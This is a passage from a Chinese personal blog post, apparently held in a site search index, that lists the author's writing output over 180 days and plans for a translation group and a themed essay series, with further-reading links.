<p>我的这些东西，在一般熟人圈子发，远远没有搞怪照片或抖机灵的段子来的点赞多。如果没有公众发表渠道，我甚至都坚持不下去。</p>
<p>正如《Economist》的成功不在普通的文字编辑，而在于强大的研究智库一样，越是信息爆炸的时代，越是需要高品质的内容输出者。</p>
<p><strong>附录：180天部分写作成果</strong></p>
<ul>
<li>Economist 译文</li>
<li>《欧洲难民危机》</li>
<li>《沙特王国改革蓝图》</li>
<li><p>《当代德国纳粹魅影》</p>
</li>
<li><p>读书笔记系列：《万历十五年》、《国士无双伍连德》、《李自成》</p>
</li>
<li>外军研究系列：《美军体能训练观察》、《美军士官制度观察》</li>
</ul>
<p>工具系列：</p>
<ul>
<li>《最佳工程实践－思维利器OmniGraffle》</li>
<li>《跑步应用Nike+ Running与Garmin Mobile评测》</li>
</ul>
<p>技术架构系列：</p>
<ul>
<li>《网络设备OpenSSH7.0兼容性测试报告》</li>
<li>《ZeroMQ 社区生态白皮书》</li>
<li>《新一代Ntopng网络流量监控—可视化和架构分析》</li>
<li>《最佳工程实践－基于Redmine的项目管理平台》</li>
<li>《Stack Overflow 架构分析》（译）</li>
<li>《基于Linux单机的负载评估》</li>
<li>《Netflix性能分析模型：In 60 Seconds》（译）</li>
<li>《TED Talk: the mind behind the Linux》（译）</li>
</ul>
<h2 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h2><ol>
<li>组织一个业余翻译社</li>
</ol>
<p>在实践翻译的过程中发现，个体的力量的多么薄弱。积聚用户需要持续输出，业余写作最大的困难又在于时间投入的不可预期上。如果能借鉴开源的一些形式和技术，是否能够将个人活动提升到团队级别呢？ 或者我应该先去为此搞一笔基金？</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/e-trans-org.png" alt="翻译社构想"></li>
</ul>
<ol>
<li>写一个专题文集</li>
</ol>
<p>主要是为了训练定力，提高专业深度。每集至少包含10篇。</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/02/09/eBook/">review:GitBook《Linux Perf Master》(201701,完成)</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2016/06/11/Writing/">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.com/2018/12/02/Writing-Technical/">技术团队中的作家</a></li>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践精要</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://sspai.com/post/57020">用了 3 年 Ulysses 后，为什么我转而选择 iA Writer 作为主力写作工具？ | 2019-10</a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Mac</tag>
        <tag>工具癖</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
</search>
